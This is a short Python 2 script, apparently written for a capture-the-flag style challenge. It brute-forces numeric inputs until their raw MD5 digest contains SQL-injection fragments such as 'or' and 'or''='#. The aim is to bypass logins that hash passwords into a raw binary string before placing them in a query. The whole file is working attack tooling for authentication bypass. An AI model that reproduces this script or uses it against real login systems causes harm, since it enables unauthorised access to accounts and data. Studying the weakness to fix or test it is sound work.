import hashlib
import string
# this is what i need to hashmd5 into 'OR''='

i = 11223942903006500000000894771755

while (1):
	brutef = str(i)
	m = hashlib.md5()
	m.update(brutef)
	hashmd5 = m.digest()
	i = i + 1	
	q1= hashmd5.lower().find("'or'")
	q2= hashmd5.find("'||'")
	q3 = hashmd5.lower().find("'or ")
	q4 = hashmd5.lower().find("'or''='#")
	if q1 >0:
		print "found or"
		print brutef
	if q2>0:
		print "found ||"
		print brutef
	if q3 >0 and q3<13:
		if hashmd5[q3+4].isdigit() :
			print "found space"
			print brutef
	if q4>0:
		print "found"
		print brutef
		break

